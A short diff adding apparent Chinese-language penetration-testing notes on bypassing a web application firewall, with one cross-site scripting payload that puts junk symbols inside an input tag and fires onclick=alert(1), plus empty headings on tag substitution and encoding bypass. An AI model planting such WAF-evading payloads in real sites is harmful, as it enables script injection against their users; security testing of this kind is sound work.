@@ -1,0 +1,8 @@
+用#等安全符号写入html内部进行waf干扰
+<input value="a" @#$type=text onclick=alert(1)>
+
+标签语法替换测试
+
+语法编码绕过
+
+
